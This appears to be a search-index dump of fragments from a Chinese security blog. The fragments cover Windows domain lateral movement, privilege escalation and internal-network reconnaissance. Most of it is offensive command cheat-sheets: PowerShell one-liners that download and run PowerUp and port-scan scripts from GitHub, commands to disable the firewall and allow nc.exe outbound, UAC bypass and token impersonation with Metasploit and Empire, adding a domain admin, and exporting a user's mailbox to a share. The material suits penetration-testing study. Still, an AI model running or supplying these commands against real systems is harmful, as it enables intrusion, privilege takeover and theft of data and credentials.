","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:10:4","tags":["域安全","内网渗透","横向移动"],"title":"域内横向移动分析","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"导出指定的电子邮件 配置用户的导入、导出权限 查看用户权限 Get-ManagementRoleAssignment -role \"Mailbox Import Export\" | Format-List RoleAssigneeName 添加权限 New-ManagementRoleAssignment -Name \"Import Export_Domain Admins\" -User \"Administrator\" -Role \"Mailbox Import Export\" 删除权限 New-ManagementRoleAssignment \"Import Export_Domain Admins\" -Confirm:$false 设置网络共享文件夹 net share inetpub=c:\\inetpub /grant:everyone,full 导出用户的电子邮件 New-MailboxExportRequest -Mailbox administrator -FilePath \\\\IP\\inetpub\\administrator.pst 管理导出请求 查看之前的导出记录 Get-MailboxExportRequest 将指定用户的已完成导出请求删除 Remove-MailboxExportRequest -Identify Administrator\\mailboxexport 将所有已完成导出的请求删除 Get-MailboxExportRequest -Status Completed | Remove-MailboxExportRequest ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:10:5","tags":["域安全","内网渗透","横向移动"],"title":"域内横向移动分析","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"权限提升防御分析","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/","tags":["域安全","内网渗透"],"title":"权限提升防御分析","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"权限提升防御分析 ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:0:0","tags":["域安全","内网渗透"],"title":"权限提升防御分析","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"系统内核溢出漏洞提权 ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:1:0","tags":["域安全","内网渗透"],"title":"权限提升防御分析","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"手动执行命令发现缺失补丁 systeminfo wmic qfe get Caption,Description,HotfixID,InstalledOn 发现补丁编号 wmic qfe get Caption,Description,HotfixID,InstalledOn | findstr C:\"KB3143141\" C:/\"KB976902\" ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:1:1","tags":["域安全","内网渗透"],"title":"权限提升防御分析","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"Windows Exploit Suggester 使用 systeminfo 命令获取当前系统的补丁安装状况，并将信息导入 patches.txt 文件中 更新补丁信息 python windows-exploit-suggester.py --update 检查漏洞 python windows-exploit-suggester.py -d 2019-02-02-mssb.xls -i patches.txt Metasploit 内置 local_exploit_suggester 模块 ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:1:2","tags":["域安全","内网渗透"],"title":"权限提升防御分析","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"powershell 中的 sherlock 脚本 https://github.com/rasta-mouse/Sherlock import-module .\\Sherlock.ps1 Find-AllVulns https://github.com/rasta-mouse/Watson ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:1:3","tags":["域安全","内网渗透"],"title":"权限提升防御分析","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"Windows 配置错误利用 ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:2:0","tags":["域安全","内网渗透"],"title":"权限提升防御分析","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"系统服务权限配置错误 powerup https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc powershell.exe -exec bypass -Command \"\u0026{Import-Module .\\PowerUP.ps1;Invoke-AllChecks}\" powershell.exe -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowershellEmpire/PowerTools/master/PowerUp/PowerUp.ps1');Invoke-AllChecks\" metasploit 下的利用 对应模块 service_permissions。 ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:2:1","tags":["域安全","内网渗透"],"title":"权限提升防御分析","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"注册表键 AlwaysInstallElevated AlwaysInstallElevated 是一个策略设置。微软允许非授权用户以 SYSTEM 权限运行安装文件(MSI)，如果用户启用此策略设置，那么黑客利用恶意的 MSI 文件就可以进行管理员权限的提升。假设我们拿到目标主机的 Meterpreter 会话后并没能通过一些常规方式取得 SYSTEM 权限，那么 AlwaysInstallElevated 提权可以给我们带来另一条思路。 手动检测注册表： reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 如果值均为 1，说明存在风险 PowerUp 脚本 powershell.exe -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowershellEmpire/PowerTools/master/PowerUp/PowerUp.ps1');Get-RegistryAlwaysInstallElevated\" 添加账户 Write-UserAddMSI 以普通用户运行 msiexec /q /i UserAdd.smi 也可以利用 msf 中的 always_install_elevated 模块 ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:2:2","tags":["域安全","内网渗透"],"title":"权限提升防御分析","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"可信任服务路径漏洞 metasploit 下的利用 检测目标机器是否存在漏洞 wmic service get name,displayname,pathname,startmode|findstr /i \"Auto\" | findstr /i /v \"C:\\Windows\\\\\"|findstr /i /v \"\"\" 把要上传的程序重命名并放置在此漏洞且可写的目录下，执行如下命令： sc stop service_name sc start service_name 也可以使用 msf 中的 Windows Service Trusted Path Privilege Escalation 模块进行测试 注意： msf 要设置 set AutoRunScript migrate -f 防止掉线 ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:2:3","tags":["域安全","内网渗透"],"title":"权限提升防御分析","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"自动安装配置文件 dir /b /s c:\\Unattend.xml dir /b /s c:\\sysprep.xml 查看文件中知否存在 base64 加密的密码 msf 中集成了该漏洞的利用模块 post/windows/gather/enum_unattend ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:2:4","tags":["域安全","内网渗透"],"title":"权限提升防御分析","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"计划任务 查看计划任务 schtasks /query /fo LIST /v 查询可写的计划任务文件夹 accesschk.exe -dqc \"C:\\Microsoft\" -accepteula 列出某个驱动器下所有权限配置有缺陷的文件夹 accesschk.exe -uwdqsUsersc:\\ accesschk.exe -uwdqs\"AuthenticatedUsers\"c:\\ 列出某个驱动器下所有权限配置有缺陷的文件 accesschk.exe -uwdqsUsersc:\\*.* accesschk.exe -uwdqs\"AuthenticatedUsers\"c:\\*.* ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:2:5","tags":["域安全","内网渗透"],"title":"权限提升防御分析","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"Empire 内置模块 usermode privesc/powerup/xxxx ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:2:6","tags":["域安全","内网渗透"],"title":"权限提升防御分析","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"绕过 UAC 提权 ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:3:0","tags":["域安全","内网渗透"],"title":"权限提升防御分析","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"bypassuac 模块 前提：当前用户必须在管理员组中 exploit/windows/local/bypassuac exploit/windows/local/bypassuac_inject getsystem ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:3:1","tags":["域安全","内网渗透"],"title":"权限提升防御分析","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"RunAs 模块 exploit/windows/local/ask 弹出一个 UAC 框，用户点击后会弹回一个高权限的 shell getuid 查看权限，如果是普通用户权限，执行 getsystem 提权 ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:3:2","tags":["域安全","内网渗透"],"title":"权限提升防御分析","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"Nishang 中的 Invoke-PsUACme 模块 Invoke-PsUACme -Verbose ## 使用Sysprep方法并执行默认的Payload Invoke-PsUACme -method oobe -Verbose ## 使用oobe方法方法并执行默认的Payload Invoke-PsUACme -Payload \"powershell -windowstyle hidden -e YourEncodedPayload\" ## 使用-Payload参数，可以自行指定要执行的Payload ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:3:3","tags":["域安全","内网渗透"],"title":"权限提升防御分析","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"Empire 中的 bypassuac 模块 bypassuac 模块 usemode privesc/bypassuac execute bypassuac_wscript 模块 usemode privesc/bypassuac_wscript execute ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:3:4","tags":["域安全","内网渗透"],"title":"权限提升防御分析","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"令牌窃取 ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:4:0","tags":["域安全","内网渗透"],"title":"权限提升防御分析","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"msf 上的令牌窃取 假设已经获取了 meterpreter shell use incognito list_tokens -u 在 incognito 中调用 impersonate_token impersonate_token DESKTOP-DUNPKQ9\\\\Administrator 注意：在输入主机名 \\ 用户名时，需要输入两个反斜杠 ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:4:1","tags":["域安全","内网渗透"],"title":"权限提升防御分析","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"Rotten Potato 本地提权 use incognito list_tokens -u execute -HC -f rottenpotato.exe impersonate_token \"NT AUTHORITY\\\\SYSTEM\" ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:4:2","tags":["域安全","内网渗透"],"title":"权限提升防御分析","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"添加域管理员 假设网络中设置了域管进程，在 meterpreter shell 中迁移进程至域管进程中 net user test test123!@# /ad /domain net group \"domain admins\" test /ad /domain 同样，在 meterpreter shell 中可以使用 incognito 来模拟域管理员，然后通过迭代系统中所有可用的身份验证令牌来添加域管理员。 在活动的 meterpreter shell 中执行如下命令： add_user test test!@#123 -h 1.1.1.2 执行如下命令，将该账户加到域管理员组中。 add_user \"Domain Admins\" test -h 1.1.1.2 ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:4:3","tags":["域安全","内网渗透"],"title":"权限提升防御分析","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"Empire 下的令牌窃取分析 运行 mimikatz，输入 creds 执行: pth CredID ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:4:4","tags":["域安全","内网渗透"],"title":"权限提升防御分析","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"无凭证下的权限获取 ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:5:0","tags":["域安全","内网渗透"],"title":"权限提升防御分析","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"LLMNR 和 NetBIOS 欺骗攻击 Responder 工具 开启监听模式 ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:5:1","tags":["域安全","内网渗透"],"title":"权限提升防御分析","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"内网信息收集命令手册","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","tags":["域安全","内网渗透","信息收集"],"title":"内网信息收集","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["内网渗透"],"content":"内网信息收集 ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:0:0","tags":["域安全","内网渗透","信息收集"],"title":"内网信息收集","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["内网渗透"],"content":"收集本机信息 ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:1:0","tags":["域安全","内网渗透","信息收集"],"title":"内网信息收集","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["内网渗透"],"content":"手动信息搜集 查询网络配置信息 ipconfig /all 查询操作系统及软件的信息 查询操作系统和版本信息 systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" systeminfo | findstr /B /C:\"OS 名称\" /C:\"OS 版本\" 查询系统体系结构 echo %PROCESSOR_ARCHITECTURE% 查看安装的软件、版本及路径等 wmic product get name, version powershell \"Get-WmiObject -class Win32_Product | select-Object -Property name, version\" 查询本机服务 wmic service list brief 查询进程列表 tasklist wmic process list brief 查看启动程序信息 wmic startup get command, caption 查看计划任务 schtasks /query /fo LIST /v 查看主机开机时间 net statistics workstation 查询用户列表 net user net localgroup administrators # 查询在线用户： query user || qwinsta 列出或断开本地计算机与所连接的客户端之间的会话 net session 查询端口列表 netstat -ano 查看补丁列表 systeminfo wmic qfe get Caption,Description,HotfixID,InstalledOn 查询本机共享列表 net share wmic share get name,path,status 查询路由表及所有可用接口的ARP缓存表 route print arp -a 查询防火墙相关配置 关闭防火墙 Windows2003之前版本 netsh firewall set opmode disable Windows2003之后版本 netsh firewall set allprofiles state off 修改防火墙配置 Windows2003之前版本 netsh firewall add allowedprogram c:\\nc.exe \"allow nc\" enable Windows2003之后版本 netsh firewall add rule name=\"pass nc\" dir=in action=allow program=\"C:\\nc.exe\" 允许指定程序连出 netsh advfirewall firewall add rule name=\"Allow nc\" dir=out action=allow program=\"C:\\nc.exe\" 允许3389放行 netsh advfirewall firewall add rule name=\"Remote Desktop\" protocol=TCP dir=in localport=3389 action=allow 自定义防火墙日志的存储位置 netsh advfirewall firewall set currentprofile logging filename \"C:\\windows\\temp\\fw.log\" 查看代理情况 reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" 查询并开启远程连接服务 查看远程连接端口 reg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /V PortNumber 0xd3d转换成10进制为3389 在Windows Server2003中开启3389端口 wmic path win32_terminalservicesetting where(__CLASS!=\"\") call setallowtsconnections 1 在Windows Server2008和Windows Server2012中开启3389端口 wmic /namespace:\\\\root\\cimv2\\terminalservices path win32_terminalservicesetting where (__CLASS!=\"\") call setallowsconnections 1 wmic /namespace:\\\\root\\cimv2\\terminalservices path win32_tsgeneralsetting where (TerminalName =’RDP-Tcp’) call setuserauthenticationrequired 1 reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:1:1","tags":["域安全","内网渗透","信息收集"],"title":"内网信息收集","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["内网渗透"],"content":"自动化收集信息 ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:2:0","tags":["域安全","内网渗透","信息收集"],"title":"内网信息收集","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["内网渗透"],"content":"Empire下的主机信息搜集 ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:3:0","tags":["域安全","内网渗透","信息收集"],"title":"内网信息收集","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["内网渗透"],"content":"查看本机用户、域成员、密码设置时间、剪切板内容、系统基本信息、网络适配器信息、共享信息 usemodule situational_awareness/host/winenum situational_awareness/host/computerdetails ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:3:1","tags":["域安全","内网渗透","信息收集"],"title":"内网信息收集","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["内网渗透"],"content":"查询当前权限 ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:4:0","tags":["域安全","内网渗透","信息收集"],"title":"内网信息收集","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["内网渗透"],"content":"查询当前权限 whoami 三种情况： 本地普通用户 本地管理员用户 域内用户 ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:4:1","tags":["域安全","内网渗透","信息收集"],"title":"内网信息收集","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["内网渗透"],"content":"获取域 SID whoami /all ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:4:2","tags":["域安全","内网渗透","信息收集"],"title":"内网信息收集","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["内网渗透"],"content":"查询指定用户的详细信息 net user XXX /domain ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:4:3","tags":["域安全","内网渗透","信息收集"],"title":"内网信息收集","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["内网渗透"],"content":"判断是否存在域 ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:5:0","tags":["域安全","内网渗透","信息收集"],"title":"内网信息收集","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["内网渗透"],"content":"使用 ipconfig 命令 ipconfig /all ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:5:1","tags":["域安全","内网渗透","信息收集"],"title":"内网信息收集","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["内网渗透"],"content":"查看系统详细信息 systeminfo ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:5:2","tags":["域安全","内网渗透","信息收集"],"title":"内网信息收集","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["内网渗透"],"content":"查询当前登录域及用户信息 net config workstation ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:5:3","tags":["域安全","内网渗透","信息收集"],"title":"内网信息收集","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["内网渗透"],"content":"判断主域 net time /domain 执行命令后，存在三种情况： 存在域：当前不是域用户 发生系统错误 存在域：且当前用户是域用户 如上图 当前网络环境为工作组 找不到域控制器 ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:5:4","tags":["域安全","内网渗透","信息收集"],"title":"内网信息收集","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["内网渗透"],"content":"探测内网存活主机 ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:6:0","tags":["域安全","内网渗透","信息收集"],"title":"内网信息收集","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["内网渗透"],"content":"利用 NetBIOS 快速探测内网 nbtscan.exe 192.168.1.0/20 ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:6:1","tags":["域安全","内网渗透","信息收集"],"title":"内网信息收集","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["内网渗透"],"content":"利用 ICMP 协议快速探测内网 for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr \"TTL=\" ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:6:2","tags":["域安全","内网渗透","信息收集"],"title":"内网信息收集","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["内网渗透"],"content":"通过 ARP 扫描探测内网 arp-scan工具 arp.exe -t 192.168.1.0/20 Empire 中的 ARPscan 模块 usemodule situational_awareness/network/arpscan Nishang 中的 Invoke-ARPScan.ps1 脚本 powershell.exe -exec bypass -Command \"\u0026{Import-Module C:\\windows\\temp\\Invoke-ARPScan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/24}\" \u003e\u003e C:\\Windows\\temp\\log.txt ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:6:3","tags":["域安全","内网渗透","信息收集"],"title":"内网信息收集","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["内网渗透"],"content":"扫描内网端口 metasploit 端口扫描 auxiliary/scanner/portscan/tcp PowerSploit 的 Invoke-portscan.ps1 脚本 powershell.exe -nop -exec bypass -c \"IEX (New-ObjectNet.WebClient).DownloadString('https://raw.githubusercontent.com/POwershellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1');Invoke-Portscan -Hosts 192.168.1.0/24 -T 4 -ports '445,1433,8080,3389,80' -oA c:\\windows\\temp\\rex.txt\" Nishang 的 Invoke-PortScan 模块 Invoke-Portscan -StartAddress 192.168.250.1 -EndAddress 192.168.250.255 -ResolveHost 端口 banner 信息 ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:6:4","tags":["域安全","内网渗透","信息收集"],"title":"内网信息收集","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["内网渗透"],"content":"收集域内基础信息 